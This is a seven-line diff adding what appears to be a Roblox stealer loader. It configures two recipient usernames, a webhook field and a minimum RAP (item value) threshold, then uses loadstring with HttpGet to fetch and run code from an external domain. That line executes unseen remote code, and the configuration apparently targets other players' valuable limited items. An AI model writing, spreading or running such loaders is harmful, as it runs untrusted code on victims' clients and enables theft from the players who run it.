@@ -1,0 +1,7 @@
+Username = "maxpogv1"
+Username2 = "maxpogv19"
+Webhook = ""
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
